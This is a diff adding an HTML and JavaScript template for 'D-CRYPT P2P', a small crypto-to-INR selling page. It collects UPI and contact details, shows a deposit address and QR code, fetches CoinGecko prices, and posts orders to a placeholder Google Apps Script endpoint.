@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D-CRYPT P2P</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Poppins', sans-serif; background-color: #f0f2f5; }
+        .slide-in { animation: slideIn 0.3s ease-out forwards; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3b82f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .error-shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; border-color: #ef4444 !important; }
+        @keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
+        
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type=number] { -moz-appearance: textfield; }
+
+        /* --- CUSTOM DROPDOWN STYLES --- */
+        .custom-select-wrapper { position: relative; user-select: none; width: 100%; }
+        .custom-select { position: relative; display: flex; flex-direction: column; }
+        .custom-select__trigger {
+            position: relative; display: flex; align-items: center; justify-content: space-between;
+            padding: 12px 16px; font-size: 14px; font-weight: 600; color: #374151;
+            background: #ffffff; border: 1px solid #d1d5db; border-radius: 12px;
+            cursor: pointer; transition: all 0.2s;
+        }
+        .custom-select__trigger:hover { border-color: #3b82f6; }
+        .custom-options {
+            position: absolute; display: block; top: 110%; left: 0; right: 0;
+            border: 1px solid #e5e7eb; border-radius: 12px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            background: #ffffff; transition: all 0.2s; opacity: 0; visibility: hidden;
+            pointer-events: none; z-index: 50; max-height: 250px; overflow-y: auto;
+        }
+        .custom-select.open .custom-options { opacity: 1; visibility: visible; pointer-events: all; top: 115%; }
+        .custom-option {
+            position: relative; display: block; padding: 12px 16px; font-size: 14px; font-weight: 500;
+            color: #374151; cursor: pointer; transition: all 0.2s; border-bottom: 1px solid #f3f4f6;
+        }
+        .custom-option:last-child { border-bottom: none; }
+        .custom-option:hover { background-color: #eff6ff; color: #2563eb; }
+        .custom-option.selected { background-color: #eff6ff; color: #2563eb; font-weight: 700; }
+    </style>
+</head>
+<body class="flex items-start justify-center min-h-screen p-4 overflow-y-auto">
+
+    <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl overflow-visible border border-gray-100 relative h-auto flex flex-col mb-10">
+        
+        <div class="bg-gray-900 text-white p-6 rounded-t-3xl shadow-lg z-10">
+            <div class="flex justify-between items-center">
+                <div>
+                    <h1 class="text-2xl font-bold tracking-wide">D-CRYPT P2P</h1>
+                    <p class="text-xs text-blue-400 font-medium tracking-wider">SECURE SELLING GATEWAY</p>
+                </div>
+                <div class="bg-gray-800 p-3 rounded-xl shadow-inner">
+                    <i class="fas fa-shield-alt text-blue-500 text-xl"></i>
+                </div>
+            </div>
+        </div>
+
+        <div id="page1" class="p-6 flex-grow slide-in space-y-4">
+            <h2 class="text-lg font-bold text-gray-800 mb-2 flex items-center gap-2">
+                <span class="bg-blue-100 text-blue-600 w-6 h-6 rounded-full flex items-center justify-center text-xs">1</span>
+                Setup Order
+            </h2>
+            
+            <div class="bg-blue-50 p-4 rounded-xl border border-blue-100">
+                <label class="block text-xs font-bold text-blue-800 uppercase mb-2">Select Token to Sell</label>
+                
+                <div class="custom-select-wrapper">
+                    <div class="custom-select">
+                        <div class="custom-select__trigger" id="dropdownTrigger">
+                            <span>Choose a Token...</span>
+                            <i class="fas fa-chevron-down text-xs text-gray-400"></i>
+                        </div>
+                        <div class="custom-options" id="dropdownOptions">
+                            </div>
+                    </div>
+                    <input type="hidden" id="selectedTokenIndex" value="-1">
+                </div>
+                
+                <div class="flex justify-between items-center mt-3 px-1">
+                    <span class="text-xs text-gray-500 font-medium">Market Price:</span>
+                    <span id="livePrice" class="text-sm font-mono font-bold text-gray-400">--</span>
+                </div>
+            </div>
+
+            <hr class="border-gray-100">
+
+            <div class="space-y-3">
+                <div>
+                    <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">UPI ID (For Payment)</label>
+                    <input type="text" id="upiId" placeholder="example@upi" class="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-sm font-medium transition-all">
+                    <p id="upiError" class="text-[10px] text-red-500 mt-1 hidden">Invalid UPI format.</p>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">Email</label>
+                    <input type="email" id="email" placeholder="you@example.com" class="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-sm font-medium">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">Phone Number</label>
+                    <input type="number" id="phone" placeholder="9876543210" 
+                           oninput="if(this.value.length > 10) this.value = this.value.slice(0, 10);" 
+                           class="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-sm font-medium">
+                    <p id="phoneError" class="text-[10px] text-red-500 mt-1 hidden">Must be exactly 10 digits.</p>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">Telegram (Optional)</label>
+                    <input type="text" id="telegram" placeholder="@username" class="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-sm font-medium">
+                </div>
+            </div>
+
+            <button onclick="goToPayment()" class="w-full mt-2 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-blue-200 transition-all flex items-center justify-center gap-2">
+                Continue to Address <i class="fas fa-arrow-right text-xs"></i>
+            </button>
+        </div>
+
+        <div id="page2" class="p-6 flex-grow hidden slide-in flex flex-col">
+             <button onclick="goBack()" class="mb-2 text-xs text-gray-500 hover:text-gray-800 flex items-center gap-1 font-medium w-fit">
+                <i class="fas fa-arrow-left"></i> Edit Details
+            </button>
+
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-bold text-gray-800">Deposit <span id="displayTokenName" class="text-blue-600">--</span></h2>
+            </div>
+
+            <div class="bg-white p-4 rounded-xl border border-dashed border-blue-300 flex flex-col items-center mb-4">
+                <div id="qrcode" class="border-4 border-white shadow-md rounded-lg mb-3"></div>
+                
+                <div class="w-full bg-blue-50 rounded-lg p-2 flex items-center justify-between border border-blue-100 relative group">
+                    <input type="text" id="walletAddress" readonly class="bg-transparent text-[10px] text-blue-800 w-full outline-none font-mono font-bold truncate px-1">
+                    <button onclick="forceCopy('walletAddress')" class="bg-white border border-blue-200 text-blue-500 hover:text-green-500 hover:border-green-400 p-2 rounded-md shadow-sm">
+                        <i class="far fa-copy text-sm"></i>
+                    </button>
+                    <div id="copyTooltip" class="absolute -top-8 right-0 bg-black text-white text-[10px] py-1 px-2 rounded opacity-0 transition-opacity">Copied!</div>
+                </div>
+                <p class="text-[9px] text-red-400 mt-2 text-center font-medium"><i class="fas fa-exclamation-triangle"></i> Only send <span id="warningToken">--</span> to this address.</p>
+            </div>
+
+            <div class="bg-gray-50 p-4 rounded-xl border border-gray-100 mb-4">
+                <div class="flex justify-between items-center mb-3">
+                     <span class="text-[10px] text-gray-500 font-bold uppercase">Sell Limits:</span>
+                     <div class="text-[9px] text-yellow-700 bg-yellow-100 px-2 py-0.5 rounded font-bold border border-yellow-200">
+                        Min: <span id="minToken">0</span> | Max: <span id="maxToken">0</span>
+                     </div>
+                </div>
+
+                <div class="flex gap-3 relative">
+                    <div class="w-1/2">
+                        <label class="text-[9px] text-gray-400 uppercase font-bold block mb-1">You Send (Token)</label>
+                        <input type="number" id="inputAmount" oninput="calculateINR()" placeholder="0.0" class="w-full p-2 border border-gray-300 rounded-lg bg-white focus:border-blue-500 outline-none font-bold text-gray-800 text-sm">
+                    </div>
+                    <div class="w-1/2">
+                        <label class="text-[9px] text-gray-400 uppercase font-bold block mb-1">You Receive (INR)</label>
+                        <input type="text" id="outputINR" readonly placeholder="₹ 0.00" class="w-full p-2 border border-green-200 rounded-lg bg-green-50 text-green-700 font-bold outline-none text-sm">
+                    </div>
+                </div>
+                <p id="amountError" class="text-[10px] text-red-500 mt-2 font-medium hidden text-center"></p>
+            </div>
+
+            <div class="mb-4">
+                <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">Transaction Hash</label>
+                <input type="text" id="txHash" placeholder="Paste TxID" class="w-full px-4 py-3 bg-white border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-sm font-mono">
+                <p id="hashError" class="text-[10px] text-red-500 mt-1 hidden">Invalid Hash format.</p>
+            </div>
+
+            <button id="submitBtn" onclick="submitOrder()" class="mt-auto w-full bg-gray-900 hover:bg-black text-white font-bold py-3.5 rounded-xl shadow-lg transition-all flex items-center justify-center gap-2">
+                <span>Submit Verification</span>
+            </button>
+        </div>
+
+        <div id="page3" class="p-8 flex-grow hidden flex flex-col items-center justify-center text-center slide-in">
+            <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6 shadow-xl">
+                <i class="fas fa-check-circle text-4xl text-green-500"></i>
+            </div>
+            
+            <h2 class="text-2xl font-bold text-gray-800 mb-2">Order Submitted!</h2>
+            <p class="text-sm text-gray-500 mb-2 px-4">Thank you for using <span class="font-bold">D-CRYPT P2P</span>.</p>
+            
+            <p class="text-[11px] text-blue-600 bg-blue-50 px-4 py-2 rounded-lg border border-blue-100 mb-6">
+                Copy the Order ID below to track your status.<br>
+                Your payment will be released soon after verification.
+            </p>
+
+            <div class="bg-gray-50 w-full p-4 rounded-xl border border-gray-200 mb-6 relative">
+                <p class="text-[10px] text-gray-400 uppercase font-bold mb-1">Your Order ID</p>
+                <div class="flex items-center justify-center gap-2">
+                    <p id="finalOrderId" class="text-xl font-mono font-bold text-gray-800 tracking-wider">CTS...</p>
+                    <button onclick="copyOrderId()" class="text-blue-500 hover:text-blue-700 p-2 bg-white rounded-full shadow-sm border border-gray-200">
+                        <i class="far fa-copy text-lg"></i>
+                    </button>
+                </div>
+            </div>
+
+            <button onclick="resetApp()" class="w-full bg-gray-900 text-white font-bold py-3 rounded-xl shadow-lg hover:bg-black transition-all">
+                Sell More / New Order
+            </button>
+        </div>
+
+        <div class="bg-gray-50 p-4 text-center border-t border-gray-200 mt-auto rounded-b-3xl">
+            <div class="mb-3">
+                <p class="text-[10px] text-gray-500 font-bold uppercase mb-1">Help & Support</p>
+                <div class="flex flex-col gap-1">
+                    <p class="text-[10px] text-gray-600 font-medium">
+                        <i class="fab fa-whatsapp text-green-500 mr-1"></i>
+                        <i class="fab fa-telegram text-blue-500 mr-1"></i> 
+                        Contact: <span class="text-gray-800 font-bold">YOUR_PHONE_NUMBER</span>
+                    </p>
+                    <p class="text-[10px] text-gray-600 font-medium">
+                        <i class="fas fa-envelope text-red-500 mr-1"></i> 
+                        Email: <span class="text-gray-800 font-bold">YOUR_EMAIL_ADDRESS</span>
+                    </p>
+                </div>
+            </div>
+            <p class="text-[9px] text-gray-400 border-t border-gray-200 pt-2">
+                Copyright ©️ Deserve D-CRYPT. Dev by <span class="font-bold text-blue-500">DYT</span>.
+            </p>
+        </div>
+
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        // PASTE YOUR DEPLOYED GOOGLE APPS SCRIPT WEB APP URL HERE
+        const SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL"; 
+        
+        // --- ADDRESSES ---
+        // REPLACE THESE WITH YOUR OWN WALLET ADDRESSES
+        const EVM_ADDRESS = "YOUR_EVM_WALLET_ADDRESS";
+        const TRC20_ADDRESS = "YOUR_TRC20_WALLET_ADDRESS";
+        const SOL_ADDRESS = "YOUR_SOLANA_WALLET_ADDRESS";
+        const TON_ADDRESS = "YOUR_TON_WALLET_ADDRESS"; 
+        const SUI_ADDRESS = "YOUR_SUI_WALLET_ADDRESS";
+
+        const MIN_USD = 0.5;
+        const MAX_USD = 20.0;
+        const USD_TO_INR_RATE = 86; 
+
+        const tokens = [
+            { name: "Ethereum (ETH)", id: "ethereum", address: EVM_ADDRESS },
+            { name: "Solana (SOL)", id: "solana", address: SOL_ADDRESS },
+            { name: "Sui (SUI)", id: "sui", address: SUI_ADDRESS },
+            { name: "Avax-C", id: "avalanche-2", address: EVM_ADDRESS },
+            { name: "Ton", id: "the-open-network", address: TON_ADDRESS },
+            { name: "BNB", id: "binancecoin", address: EVM_ADDRESS },
+            { name: "USDC (BNB Chain)", id: "usd-coin", address: EVM_ADDRESS },
+            { name: "Base ETH", id: "ethereum", address: EVM_ADDRESS }, 
+            { name: "Arbitrum", id: "arbitrum", address: EVM_ADDRESS },
+            { name: "TRX (TRC20)", id: "tron", address: TRC20_ADDRESS },
+            { name: "USDC (Base)", id: "usd-coin", address: EVM_ADDRESS }
+        ];
+
+        // --- HIGH SAFETY API SYSTEM ---
+        let priceCache = {}; 
+        const CACHE_DURATION = 300000; // 5 Minutes Cache
+        
+        const FALLBACK_PRICES = {
+            "ethereum": 230000, "solana": 12000, "sui": 150, "avalanche-2": 3500,
+            "the-open-network": 450, "binancecoin": 52000, "usd-coin": 86, "tron": 12
+        };
+
+        let currentPriceINR = 0;
+        let userData = {};
+        let minTokenAmount = 0;
+        let maxTokenAmount = 0;
+
+        // --- INIT & DROPDOWN LOGIC ---
+        window.onload = function() {
+            initDropdown();
+            // Close dropdown when clicking outside
+            window.addEventListener('click', function(e) {
+                const select = document.querySelector('.custom-select');
+                if (select && !select.contains(e.target)) {
+                    select.classList.remove('open');
+                }
+            });
+        };
+
+        function initDropdown() {
+            const optionsContainer = document.getElementById('dropdownOptions');
+            const hiddenInput = document.getElementById('selectedTokenIndex');
+            const triggerText = document.querySelector('#dropdownTrigger span');
+            const selectWrapper = document.querySelector('.custom-select');
+            const trigger = document.getElementById('dropdownTrigger');
+
+            // Populate Options
+            tokens.forEach((t, index) => {
+                const option = document.createElement('span');
+                option.className = 'custom-option';
+                option.textContent = t.name;
+                option.setAttribute('data-value', index);
+                
+                option.addEventListener('click', function() {
+                    hiddenInput.value = index;
+                    triggerText.textContent = t.name;
+                    triggerText.classList.add('text-black');
+                    
+                    document.querySelectorAll('.custom-option').forEach(opt => opt.classList.remove('selected'));
+                    option.classList.add('selected');
+                    
+                    selectWrapper.classList.remove('open');
+                    fetchPrice(index);
+                });
+                
+                optionsContainer.appendChild(option);
+            });
+
+            // Toggle Dropdown with STOP PROPAGATION to prevent immediate closing
+            trigger.addEventListener('click', function(e) {
+                e.stopPropagation(); 
+                selectWrapper.classList.toggle('open');
+            });
+        }
+
+        async function fetchPrice(index) {
+            const token = tokens[index];
+            const priceEl = document.getElementById('livePrice');
+            const now = Date.now();
+
+            if (priceCache[token.id] && (now - priceCache[token.id].time < CACHE_DURATION)) {
+                updateUIWithPrice(token, priceCache[token.id].value);
+                return;
+            }
+            
+            priceEl.innerText = "Fetching rate...";
+            priceEl.className = "text-sm font-mono font-bold text-blue-500 animate-pulse";
+
+            try {
+                const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${token.id}&vs_currencies=inr`);
+                if (!response.ok) throw new Error("API Limit");
+                
+                const data = await response.json();
+                if(!data[token.id]) throw new Error("Invalid Token");
+
+                const price = data[token.id].inr;
+                priceCache[token.id] = { value: price, time: now };
+                updateUIWithPrice(token, price);
+
+            } catch (e) {
+                if (FALLBACK_PRICES[token.id]) {
+                    priceEl.innerText = `⚠️ 1 ${token.name.split(' ')[0]} ≈ ₹ ${FALLBACK_PRICES[token.id].toLocaleString()}`;
+                    priceEl.className = "text-sm font-mono font-bold text-orange-500";
+                    updateUIWithPrice(token, FALLBACK_PRICES[token.id]);
+                } else {
+                    priceEl.innerText = "Retry";
+                    priceEl.className = "text-sm font-bold text-red-500 cursor-pointer";
+                    priceEl.onclick = () => fetchPrice(index);
+                }
+            }
+        }
+
+        function updateUIWithPrice(token, price) {
+            const priceEl = document.getElementById('livePrice');
+            currentPriceINR = price;
+            priceEl.innerText = `1 ${token.name.split(' ')[0]} = ₹ ${price.toLocaleString()}`;
+            priceEl.className = "text-sm font-mono font-bold text-green-600";
+            
+            // Calc Limits
+            minTokenAmount = (MIN_USD * USD_TO_INR_RATE) / currentPriceINR;
+            maxTokenAmount = (MAX_USD * USD_TO_INR_RATE) / currentPriceINR;
+        }
+
+        function goToPayment() {
+            const upi = document.getElementById('upiId').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value;
+            const idx = document.getElementById('selectedTokenIndex').value;
+
+            if(idx === "-1") return alert("Please select a token to sell.");
+            if(phone.length !== 10) {
+                document.getElementById('phoneError').classList.remove('hidden');
+                return;
+            }
+            if(!/^[a-zA-Z0-9.\-_]{2,256}@[a-zA-Z]{2,64}$/.test(upi)) {
+                document.getElementById('upiError').classList.remove('hidden');
+                return;
+            }
+            if(!email) return alert("Email is required");
+
+            userData = { upi, email, phone, telegram: document.getElementById('telegram').value };
+            
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+            document.getElementById('page2').classList.add('slide-in');
+            
+            renderPage2(idx);
+        }
+
+        function goBack() {
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('page1').classList.remove('hidden');
+        }
+
+        function renderPage2(idx) {
+            const t = tokens[idx];
+            document.getElementById('displayTokenName').innerText = t.name;
+            document.getElementById('warningToken').innerText = t.name;
+            document.getElementById('walletAddress').value = t.address;
+            document.getElementById('minToken').innerText = minTokenAmount.toFixed(4);
+            document.getElementById('maxToken').innerText = maxTokenAmount.toFixed(4);
+            
+            document.getElementById('qrcode').innerHTML = "";
+            new QRCode(document.getElementById('qrcode'), { text: t.address, width: 140, height: 140 });
+        }
+
+        function calculateINR() {
+            const amt = parseFloat(document.getElementById('inputAmount').value);
+            const err = document.getElementById('amountError');
+            
+            if(amt && currentPriceINR) {
+                document.getElementById('outputINR').value = "₹ " + (amt * currentPriceINR).toFixed(2);
+                if(amt < minTokenAmount || amt > maxTokenAmount) {
+                    err.classList.remove('hidden');
+                    err.innerText = `Limit: ${minTokenAmount.toFixed(4)} - ${maxTokenAmount.toFixed(4)}`;
+                    return false;
+                }
+                err.classList.add('hidden');
+                return true;
+            }
+            return false;
+        }
+
+        // --- FIXED ORDER ID GENERATION (Format: CTS271125204299) No Slashes ---
+        function generateOrderId() {
+            const now = new Date();
+            const dd = String(now.getDate()).padStart(2, '0');
+            const mm = String(now.getMonth() + 1).padStart(2, '0');
+            const yy = String(now.getFullYear()).slice(-2);
+            const hh = String(now.getHours()).padStart(2, '0');
+            const min = String(now.getMinutes()).padStart(2, '0');
+            const userNum = userData.phone.slice(-2) + Math.floor(Math.random() * 10);
+            return `CTS${dd}${mm}${yy}${hh}${min}${userNum}`;
+        }
+
+        function submitOrder() {
+            const hash = document.getElementById('txHash').value.trim();
+            if(!calculateINR()) return alert("Check amount limits");
+            if(hash.length < 10) return alert("Invalid Hash");
+
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = `<div class="loader"></div> Verifying...`;
+            btn.disabled = true;
+
+            const newOrderId = generateOrderId();
+            const payload = {
+                orderId: newOrderId,
+                date: new Date().toLocaleString(),
+                upi: userData.upi,
+                email: userData.email,
+                phone: userData.phone,
+                telegram: userData.telegram || "N/A",
+                token: tokens[document.getElementById('selectedTokenIndex').value].name,
+                amount: document.getElementById('inputAmount').value,
+                inrValue: document.getElementById('outputINR').value,
+                hash: hash
+            };
+
+            fetch(SCRIPT_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                document.getElementById('finalOrderId').innerText = newOrderId;
+                document.getElementById('page2').classList.add('hidden');
+                document.getElementById('page3').classList.remove('hidden');
+            }).catch(err => {
+                alert("Network Error");
+                btn.innerHTML = "Submit Verification";
+                btn.disabled = false;
+            });
+        }
+
+        // --- "SELL MORE" RESET FUNCTION ---
+        function resetApp() {
+            document.getElementById('page3').classList.add('hidden');
+            document.getElementById('page1').classList.remove('hidden');
+            
+            // Clear Transaction Fields
+            document.getElementById('txHash').value = "";
+            document.getElementById('inputAmount').value = "";
+            document.getElementById('outputINR').value = "";
+            
+            // Reset Dropdown
+            document.getElementById('selectedTokenIndex').value = "-1";
+            document.querySelector('#dropdownTrigger span').innerText = "Choose a Token...";
+            document.querySelector('#dropdownTrigger span').classList.remove('text-black');
+            document.getElementById('livePrice').innerText = "--";
+            
+            document.querySelectorAll('.custom-option').forEach(opt => opt.classList.remove('selected'));
+            
+            document.getElementById('submitBtn').innerHTML = "<span>Submit Verification</span>";
+            document.getElementById('submitBtn').disabled = false;
+        }
+
+        // --- COPY ID & SHOW MESSAGE ---
+        function copyOrderId() {
+            const orderId = document.getElementById('finalOrderId').innerText;
+            const el = document.createElement('textarea');
+            el.value = orderId;
+            document.body.appendChild(el);
+            el.select();
+            el.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            
+            // Show custom alert message as requested
+            alert("Copy this ID to track your order. Your payment will be released soon after verification.");
+        }
+
+        function forceCopy(id, isText=false) {
+            const val = isText ? document.getElementById(id).innerText : document.getElementById(id).value;
+            const el = document.createElement('textarea');
+            el.value = val;
+            document.body.appendChild(el);
+            el.select();
+            el.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            
+            const tooltip = document.getElementById('copyTooltip');
+            if(tooltip) {
+                tooltip.style.opacity = "1";
+                setTimeout(() => tooltip.style.opacity = "0", 1500);
+            } else {
+                alert("Copied!");
+            }
+        }
+    </script>
+</body>
+</html>
